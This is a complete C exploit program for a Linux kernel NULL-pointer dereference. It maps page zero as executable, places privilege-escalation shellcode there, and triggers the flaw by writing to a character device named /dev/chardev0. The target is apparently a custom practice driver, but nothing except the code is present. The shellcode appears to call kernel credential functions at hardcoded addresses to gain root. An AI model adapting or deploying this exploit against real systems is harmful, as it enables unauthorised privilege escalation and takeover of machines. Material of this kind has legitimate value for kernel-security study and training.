#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

char shellcode[] = "\x48\x31\xff\xe8\xe8\x34\x68\x95\x48\x97\xe8\x41\x31\x68\x95\xc3";

int main(){

	char *addr = mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if(addr != 0){
		printf("Unable to mmap in 0x0\n");
		return -1;
	}

	printf("MMAPED zero page succeed!\n");
	memcpy(0, shellcode, strlen(shellcode));

	int fd = open("/dev/chardev0", O_WRONLY);

	if(fd < 0){
		printf("Unable to open the character device!\n");
		return -1;
	}

	write(fd, "MAHER", 5);
	close(fd);

	return 0;
}
